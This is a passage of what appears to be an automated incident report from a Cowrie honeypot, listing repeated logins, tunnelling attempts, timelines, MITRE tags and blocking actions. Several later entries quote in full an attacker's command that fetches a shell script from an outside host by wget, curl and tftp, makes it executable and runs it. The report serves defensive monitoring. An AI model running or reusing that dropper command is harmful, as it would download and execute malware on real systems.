| `2026-08-25 09:07:32` | `cowrie.session.connect` |
| `2026-08-25 09:07:32` | `cowrie.client.version` |
| `2026-08-25 09:07:32` | `cowrie.client.kex` |
| `2026-08-25 09:07:33` | `cowrie.login.success` |
| `2026-08-25 09:07:33` | `cowrie.direct-tcpip.request` |
| `2026-08-25 09:07:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 09:07:33` | `cowrie.direct-tcpip.data` |
| `2026-08-25 09:07:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10c250cb3d20

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 09:07 |
| **Last Seen** | 2026-08-25 09:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:07:36` | `cowrie.session.connect` |
| `2026-08-25 09:07:36` | `cowrie.client.version` |
| `2026-08-25 09:07:36` | `cowrie.client.kex` |
| `2026-08-25 09:07:37` | `cowrie.login.success` |
| `2026-08-25 09:07:37` | `cowrie.direct-tcpip.request` |
| `2026-08-25 09:07:37` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 09:07:37` | `cowrie.direct-tcpip.data` |
| `2026-08-25 09:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16a14f76f613

| Field | Detail |
|---|---|
| **Source IP** | `111.53.8[.]101` |
| **First Seen** | 2026-08-25 09:08 |
| **Last Seen** | 2026-08-25 09:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `grep -c ^processor /proc/cpuinfo` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:08:31` | `cowrie.session.connect` |
| `2026-08-25 09:08:31` | `cowrie.client.version` |
| `2026-08-25 09:08:31` | `cowrie.client.kex` |
| `2026-08-25 09:08:32` | `cowrie.login.success` |
| `2026-08-25 09:08:33` | `cowrie.session.params` |
| `2026-08-25 09:08:33` | `cowrie.command.input` |
| `2026-08-25 09:08:34` | `cowrie.log.closed` |
| `2026-08-25 09:08:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.53.8[.]101` to AbuseIPDB if not already reported
- [ ] Block `111.53.8[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cc35809adad

| Field | Detail |
|---|---|
| **Source IP** | `111.53.8[.]101` |
| **First Seen** | 2026-08-25 09:08 |
| **Last Seen** | 2026-08-25 09:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `grep -c ^processor /proc/cpuinfo` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:08:34` | `cowrie.session.connect` |
| `2026-08-25 09:08:34` | `cowrie.client.version` |
| `2026-08-25 09:08:34` | `cowrie.client.kex` |
| `2026-08-25 09:08:35` | `cowrie.login.success` |
| `2026-08-25 09:08:36` | `cowrie.session.params` |
| `2026-08-25 09:08:36` | `cowrie.command.input` |
| `2026-08-25 09:08:37` | `cowrie.log.closed` |
| `2026-08-25 09:08:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.53.8[.]101` to AbuseIPDB if not already reported
- [ ] Block `111.53.8[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3404d3ef531

| Field | Detail |
|---|---|
| **Source IP** | `101.43.79[.]210` |
| **First Seen** | 2026-08-25 09:14 |
| **Last Seen** | 2026-08-25 09:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:14:04` | `cowrie.session.connect` |
| `2026-08-25 09:14:12` | `cowrie.telnet.option` |
| `2026-08-25 09:14:16` | `cowrie.telnet.option` |
| `2026-08-25 09:15:21` | `cowrie.login.success` |
| `2026-08-25 09:15:22` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `101.43.79[.]210` to AbuseIPDB if not already reported
- [ ] Block `101.43.79[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-793a28d4abdc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 09:17 |
| **Last Seen** | 2026-08-25 09:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:17:02` | `cowrie.session.connect` |
| `2026-08-25 09:17:02` | `cowrie.client.version` |
| `2026-08-25 09:17:02` | `cowrie.client.kex` |
| `2026-08-25 09:17:03` | `cowrie.login.success` |
| `2026-08-25 09:17:03` | `cowrie.direct-tcpip.request` |
| `2026-08-25 09:17:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 09:17:03` | `cowrie.direct-tcpip.data` |
| `2026-08-25 09:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c3bed8a7db3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 09:17 |
| **Last Seen** | 2026-08-25 09:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:17:06` | `cowrie.session.connect` |
| `2026-08-25 09:17:06` | `cowrie.client.version` |
| `2026-08-25 09:17:06` | `cowrie.client.kex` |
| `2026-08-25 09:17:07` | `cowrie.login.success` |
| `2026-08-25 09:17:08` | `cowrie.direct-tcpip.request` |
| `2026-08-25 09:17:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 09:17:08` | `cowrie.direct-tcpip.data` |
| `2026-08-25 09:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d54fe3670e80

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 09:26 |
| **Last Seen** | 2026-08-25 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:26:49` | `cowrie.session.connect` |
| `2026-08-25 09:26:49` | `cowrie.client.version` |
| `2026-08-25 09:26:49` | `cowrie.client.kex` |
| `2026-08-25 09:26:50` | `cowrie.login.success` |
| `2026-08-25 09:26:50` | `cowrie.direct-tcpip.request` |
| `2026-08-25 09:26:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 09:26:51` | `cowrie.direct-tcpip.data` |
| `2026-08-25 09:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-561ee598fa7e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 09:26 |
| **Last Seen** | 2026-08-25 09:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:26:54` | `cowrie.session.connect` |
| `2026-08-25 09:26:54` | `cowrie.client.version` |
| `2026-08-25 09:26:54` | `cowrie.client.kex` |
| `2026-08-25 09:26:55` | `cowrie.login.success` |
| `2026-08-25 09:26:55` | `cowrie.direct-tcpip.request` |
| `2026-08-25 09:26:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 09:26:55` | `cowrie.direct-tcpip.data` |
| `2026-08-25 09:26:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23daae76b70a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 09:36 |
| **Last Seen** | 2026-08-25 09:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:36:54` | `cowrie.session.connect` |
| `2026-08-25 09:36:54` | `cowrie.client.version` |
| `2026-08-25 09:36:54` | `cowrie.client.kex` |
| `2026-08-25 09:36:55` | `cowrie.login.success` |
| `2026-08-25 09:36:55` | `cowrie.direct-tcpip.request` |
| `2026-08-25 09:36:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 09:36:55` | `cowrie.direct-tcpip.data` |
| `2026-08-25 09:36:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72c93f270020

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 09:36 |
| **Last Seen** | 2026-08-25 09:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:36:58` | `cowrie.session.connect` |
| `2026-08-25 09:36:58` | `cowrie.client.version` |
| `2026-08-25 09:36:58` | `cowrie.client.kex` |
| `2026-08-25 09:36:59` | `cowrie.login.success` |
| `2026-08-25 09:36:59` | `cowrie.direct-tcpip.request` |
| `2026-08-25 09:36:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 09:36:59` | `cowrie.direct-tcpip.data` |
| `2026-08-25 09:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f617c19fa3f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 09:46 |
| **Last Seen** | 2026-08-25 09:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:46:46` | `cowrie.session.connect` |
| `2026-08-25 09:46:46` | `cowrie.client.version` |
| `2026-08-25 09:46:46` | `cowrie.client.kex` |
| `2026-08-25 09:46:47` | `cowrie.login.success` |
| `2026-08-25 09:46:47` | `cowrie.direct-tcpip.request` |
| `2026-08-25 09:46:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 09:46:48` | `cowrie.direct-tcpip.data` |
| `2026-08-25 09:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4166537aa943

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 09:46 |
| **Last Seen** | 2026-08-25 09:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:46:50` | `cowrie.session.connect` |
| `2026-08-25 09:46:50` | `cowrie.client.version` |
| `2026-08-25 09:46:50` | `cowrie.client.kex` |
| `2026-08-25 09:46:51` | `cowrie.login.success` |
| `2026-08-25 09:46:51` | `cowrie.direct-tcpip.request` |
| `2026-08-25 09:46:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 09:46:51` | `cowrie.direct-tcpip.data` |
| `2026-08-25 09:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9db4a592410

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:54 |
| **Last Seen** | 2026-08-25 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:54:43` | `cowrie.session.connect` |
| `2026-08-25 09:54:43` | `cowrie.login.success` |
| `2026-08-25 09:54:44` | `cowrie.session.params` |
| `2026-08-25 09:54:44` | `cowrie.log.closed` |
| `2026-08-25 09:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b002b1db79bb

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:54 |
| **Last Seen** | 2026-08-25 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:54:45` | `cowrie.session.connect` |
| `2026-08-25 09:54:45` | `cowrie.login.success` |
| `2026-08-25 09:54:45` | `cowrie.session.params` |
| `2026-08-25 09:54:46` | `cowrie.command.input` |
| `2026-08-25 09:54:46` | `cowrie.session.file_download` |
| `2026-08-25 09:54:46` | `cowrie.session.file_download` |
| `2026-08-25 09:54:46` | `cowrie.session.file_download` |
| `2026-08-25 09:54:46` | `cowrie.log.closed` |
| `2026-08-25 09:54:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ebf8d7846d1

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:54 |
| **Last Seen** | 2026-08-25 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:54:46` | `cowrie.session.connect` |
| `2026-08-25 09:54:46` | `cowrie.login.success` |
| `2026-08-25 09:54:47` | `cowrie.session.params` |
| `2026-08-25 09:54:47` | `cowrie.command.input` |
| `2026-08-25 09:54:47` | `cowrie.session.file_download` |
| `2026-08-25 09:54:47` | `cowrie.session.file_download` |
| `2026-08-25 09:54:47` | `cowrie.session.file_download` |
| `2026-08-25 09:54:47` | `cowrie.log.closed` |
| `2026-08-25 09:54:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff013bee46c6

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:54 |
| **Last Seen** | 2026-08-25 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:54:48` | `cowrie.session.connect` |
| `2026-08-25 09:54:48` | `cowrie.login.success` |
| `2026-08-25 09:54:48` | `cowrie.session.params` |
| `2026-08-25 09:54:49` | `cowrie.command.input` |
| `2026-08-25 09:54:49` | `cowrie.session.file_download` |
| `2026-08-25 09:54:49` | `cowrie.session.file_download` |
| `2026-08-25 09:54:49` | `cowrie.log.closed` |
| `2026-08-25 09:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6480227c6e3

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:54 |
| **Last Seen** | 2026-08-25 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:54:49` | `cowrie.session.connect` |
| `2026-08-25 09:54:49` | `cowrie.login.success` |
| `2026-08-25 09:54:50` | `cowrie.session.params` |
| `2026-08-25 09:54:50` | `cowrie.command.input` |
| `2026-08-25 09:54:50` | `cowrie.command.success` |
| `2026-08-25 09:54:50` | `cowrie.session.file_download` |
| `2026-08-25 09:54:50` | `cowrie.log.closed` |
| `2026-08-25 09:54:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47a15baf024f

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:54 |
| **Last Seen** | 2026-08-25 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:54:51` | `cowrie.session.connect` |
| `2026-08-25 09:54:51` | `cowrie.login.success` |
| `2026-08-25 09:54:51` | `cowrie.session.params` |
| `2026-08-25 09:54:51` | `cowrie.command.input` |
| `2026-08-25 09:54:51` | `cowrie.command.success` |
| `2026-08-25 09:54:52` | `cowrie.session.file_download` |
| `2026-08-25 09:54:52` | `cowrie.log.closed` |
| `2026-08-25 09:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ded781ce9d4

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:54 |
| **Last Seen** | 2026-08-25 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:54:52` | `cowrie.session.connect` |
| `2026-08-25 09:54:52` | `cowrie.login.success` |
| `2026-08-25 09:54:53` | `cowrie.session.params` |
| `2026-08-25 09:54:53` | `cowrie.command.input` |
| `2026-08-25 09:54:53` | `cowrie.command.success` |
| `2026-08-25 09:54:53` | `cowrie.log.closed` |
| `2026-08-25 09:54:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b3dd5435d8f

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:54 |
| **Last Seen** | 2026-08-25 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:54:53` | `cowrie.session.connect` |
| `2026-08-25 09:54:54` | `cowrie.login.success` |
| `2026-08-25 09:54:54` | `cowrie.session.params` |
| `2026-08-25 09:54:54` | `cowrie.command.input` |
| `2026-08-25 09:54:54` | `cowrie.command.success` |
